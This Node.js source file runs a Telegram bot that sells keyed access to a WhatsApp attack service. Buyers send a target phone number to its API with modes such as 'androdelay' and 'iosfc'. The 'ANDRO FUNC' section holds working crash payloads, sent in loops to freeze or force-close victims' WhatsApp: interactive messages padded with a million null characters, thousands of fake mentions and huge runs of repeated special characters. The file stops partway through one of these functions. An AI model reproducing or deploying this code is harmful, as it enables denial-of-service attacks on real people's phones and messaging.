const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");

app.set('trust proxy', true); // jika pakai reverse proxy

// Role definitions
const ROLES = {
  OWNER: 'owner',
  ADMIN: 'admin',
  MODERATOR: 'moderator',
  HELPER: 'helper',
  PREMIUM: 'premium',
  VIP: 'vip',
  EXCLUSIVE: 'exclusive'
};

// Role hierarchy for permission checking
const ROLE_HIERARCHY = {
  [ROLES.OWNER]: 6,
  [ROLES.ADMIN]: 5,
  [ROLES.MODERATOR]: 4,
  [ROLES.HELPER]: 3,
  [ROLES.PREMIUM]: 2,
  [ROLES.VIP]: 1,
  [ROLES.EXCLUSIVE]: 0
};

// Attack mode requirements
const ATTACK_REQUIREMENTS = {
  ph4ntom: ROLES.VIP,
  extr4vaz: ROLES.ADMIN,
  sl4yerz: ROLES.PREMIUM,
  ex4ltedz: ROLES.MODERATOR,
  w4nnacry: ROLES.HELPER
};

// Role permissions
const ROLE_PERMISSIONS = {
  [ROLES.ADMIN]: {
    userManagement: true,
    senderManagement: true
  },
  [ROLES.MODERATOR]: {
    userManagement: true,
    senderManagement: true
  },
  [ROLES.HELPER]: {
    userManagement: true,
    senderManagement: true
  },
  // Other roles have these permissions false by default
};

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function saveUsers(users) {
    const filePath = path.join(__dirname, 'database', 'user.json');

    try {
      fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
      console.log("✅ Data user berhasil disimpan.");
    } catch (err) {
      console.error("❌ Gagal menyimpan user:", err);
    }
  }
  
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('lotusbail');

let sock;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "OVERLOAD");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT EVOLUTION WEB
├─ ID OWN : ${OwnerId}
├─ BOT : CONNECTED ✅
╰───────────────────`));
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Welcome to Evolution Web*

🛡️ SYSTEM COMMAND ACCESS 🛡️

/addakses   → Grant Access
/delakses   → Revoke Access  
/addowner   → Grant Access  
/delowner   → Remove Acces  
/addkey     → Create API Key 
/delkey     → Remove API Key  
/listkey    → Reveal All Active Key  
/connect    → Bind Your Bot Session  
/listsender   → Trace Active Sender
/delsender   → Purge Sender Identity

📥 PANEL LOGIN
→ http://evolutionweb.gacorr.biz.id/login

📡 ACTIVITY IS MONITORED  
All operations are logged.  
No traces. No forgiveness.

💬 CONTACT ADMIN  
└─ (https://t.me/dxychi)

_You are now inside the grid.  
Power is yours to command._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
  }
});

bot.command("addkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }
  const args = ctx.message.text.split(" ")[1];
  if (!args || !args.includes(",")) {
    return ctx.reply("❗ Format salah.\nContoh: /addkey ataaxd,30d,admin");
  }

  const [username, durasiStr, role] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  const userRole = role?.trim().toLowerCase() || ROLES.VIP;

  if (!durationMs) {
    return ctx.reply("❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");
  }

  if (!Object.values(ROLES).includes(userRole)) {
    return ctx.reply(`❌ Role tidak valid. Pilihan role: ${Object.values(ROLES).join(', ')}`);
  }

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex].key = key;
    users[userIndex].expired = expired;
    users[userIndex].role = userRole;
  } else {
    users.push({ username, key, expired, role: userRole });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  const apiBaseUrl = `http://${VPS}:${PORT}/execution`;

  const functionCode = `
🧬 API WEB : \`http://${VPS}:${PORT}/\`
💻 *Contoh Pemakaian Script Client:*

\`\`\`js
const axios = require("axios");

async function sendDelayAndro(targetNumber) {
  try {
    const res = await axios.get(\`${apiBaseUrl}?target=\${targetNumber}&mode=androdelay&username=${username}&key=${key}\`);
    console.log("✅ androdelay:", res.data);
  } catch (err) {
    console.error("❌ Gagal androdelay:", err.response?.data || err.message);
  }
}

async function sendFcAndro(targetNumber) {
  try {
    const res = await axios.get(\`${apiBaseUrl}?target=\${targetNumber}&mode=androdelay&username=${username}&key=${key}\`);
    console.log("✅ androdelay:", res.data);
  } catch (err) {
    console.error("❌ Gagal androdelay:", err.response?.data || err.message);
  }
}

async function sendFcIOS(targetNumber) {
  try {
    const res = await axios.get(\`${apiBaseUrl}?target=\${targetNumber}&mode=iosfc&username=${username}&key=${key}\`);
    console.log("✅ iosfc:", res.data);
  } catch (err) {
    console.error("❌ Gagal iosfc:", err.response?.data || err.message);
  }
}

// Contoh:
// await sendDelayAndro("628xxxx");
// await sendFcAndro("628xxxx");
// await sendFcIOS("628xxxx");
\`\`\`
`;

  ctx.replyWithMarkdown(`✅ *Key berhasil dibuat:*\n\n*Username:* \`${username}\`\n*Key:* \`${key}\`\n*Role:* ${userRole.toUpperCase()}\n*Expired:* _${expiredStr}_ WIB\n\n${functionCode}`);
});

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');

  if (!fs.existsSync(filePath)) return [];

  try {
    const data = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(data);

    if (Array.isArray(parsed)) {
      return parsed;
    }

    if (typeof parsed === 'object' && parsed !== null) {
      return [parsed];
    }

    return [];
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

bot.command("listkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const users = getUsers();
  if (users.length === 0) return ctx.reply("📭 Belum ada key yang dibuat.");

  let teks = `📜 *Daftar Key Aktif:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nRole: ${u.role?.toUpperCase() || 'VIP'}\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("❗ Masukkan username!\nContoh: /delkey ataaxd");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username \`${username}\` tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);

  ctx.reply(`🗑️ Key milik *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addakses", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa tambah akses!");

  const id = ctx.message.text.split(" ")[1];
  if (!id || isNaN(id)) return ctx.reply("⚠️ Format: /addakses <user_id>");

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User sudah punya akses.");

  data.akses.push(id);
  saveAkses(data);

  ctx.reply(`✅ Akses diberikan ke ID: ${id}`);
});

bot.command("delakses", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa hapus akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delakses <user_id>");

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Akses user ID ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa tambah owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addowner <user_id>");

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✅ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`👑 Owner baru ditambahkan: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa hapus owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delowner <user_id>");

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Owner ID ${id} berhasil dihapus.`);
});

// -------------------( ANDRO FUNC )------------------------------ \\
async function svlzVs(sock, target, count) {
var xts = { url: "https://l.top4top.io/p_3552yqrjh1.jpg" }
for (let i = 0; i < count; i++) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " #DxyVxZ-VxZ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 2000 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9000000) +
                  "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 555,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: false,
              renderLargerThumbnail: false,
              title: "! DxyVxZ - \"𝗋34\" 🩸",
              body: "https://rule34.com",
              previewType: "VIDEO",
              mediaType: "VIDEO",
              thumbnail: xts,
              sourceUrl: "t.me/rizxvelzexct",
              mediaUrl: "t.me/rizxvelzexct",
              sourceType: " x ",
              sourceId: " x ",
              containsAutoReply: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            quotedAd: {
              advertiserName: " X ",
              mediaType: "IMAGE",
              jpegThumbnail: xts,
              caption: " X ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X ",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X ",
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
 }
}

async function overmpm(sock, target, count) {
for (let i = 0; i < count; i++) {
  const msg = await generateWAMessageFromContent(
    target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { 
                text: "ꦾ".repeat(1000) + "\u0000".repeat(1000) /* +"Kasih Text Ui Kalo Mawu".repeat(9000) */
              }, 
              footer: {
                text: "ꦾ".repeat(1000)}, 
              nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                  limited_time_offer: {
                    text: "ꦾ".repeat(1000), 
                    url: "https://t.me/YuukeyD7eppeli", 
                    copy_code: "\u0000".repeat(1000), 
                    expiration_time: Date.now() * 250208
                  }
                }),
                buttons: [
                  { 
                    name: "single_select", 
                    buttonParamsJson: JSON.stringify({ status: true })
                  },
                  { 
                    name: "mpm",
                    buttonParamsJson: JSON.stringify({ status: true })
                  }
                ]
              },
              contextInfo: {
                participant: target,
                mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)],
                remoteJid: "ꦾ".repeat(1000), 
                stanzaId: "123",
                quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() / 7
                },
                isForwarded: true, 
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                  newsletterName: "ꦾ".repeat(1000),
                  newsletterJid: "123025022008@newsletter",
                  serverId: 7
                }
              }
            }
          }
        }
      }
    }, { userJid: target } 
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
  }
}

async function CrashViewHys(sock, target, count) {
  let baten = [];
  const buttonss = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
        }),
      },
      {
      name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                  }),
    },
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        }),
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        }),
      },
      {
      name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                  }),
      }
    );
  }

let StuckLogo = [];
  const buttons = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
        }),
      },
      {
      name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                  }),
    },
  ];

  for (let i = 0; i < 10; i++) {
    StuckLogo.push(
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        }),
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        }),
      },
      {
      name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                  }),
      }
    );
  }
  
  let Mp4 = [];
  const buttonsss = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
        }),
      },
      {
      name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                  }),
    },
  ];

  for (let i = 0; i < 10; i++) {
    Mp4.push(
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
      { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) },
      {
      name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                  }),
      }
    );
  }

for (let i = 0; i < count; i++) {
  const stxview = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: target,
            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
            groupInviteMessage: {
              groupJid: "120363347113453659@g.us",
              inviteCode: "",
              inviteExpiration: Date.now(),
              groupName:
                "D | DxyVxZ-Exploration" + "𑇂𑆵𑆴𑆿".repeat(15000),
              caption: "Haha Blank Lol",
              jpegThumbnail: null,
            },
          },
          header: {
            title: "D | DxyVxZ-Exploration" + "ꦽ".repeat(70000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype:
                "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: null,
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath:
                "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath:
                "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD",
            },
            hasMediaAttachment: true,
          },
          body: { text: "" },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "6281933605296@s.whatsapp.net",
            isForwarded: true,
            forwardingScore: 250208,
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net",
            },
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
            ),
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "D | DxyVxZ-Exploration",
                url: "https://Wa.me/stickerpack/Tzy",
                copy_code: "𑲭".repeat(9000),
                expiration_time: Date.now() * 1000,
              },
              reminder_info: {
                reminder_status: "reminder_pending",
                scheduled_timestamp: Date.now() * 1000,
              },
            }),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                }),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "REVIEW",
                  flow_cta: "\u0000",
                  flow_message_version: "3",
                }),
              },
              ...baten,
              ...StuckLogo,
              ...Mp4,
            ],
          },
        },
      },
    },
    ephemeralExpiration: 5,
    timeStamp: Date.now(),
  };

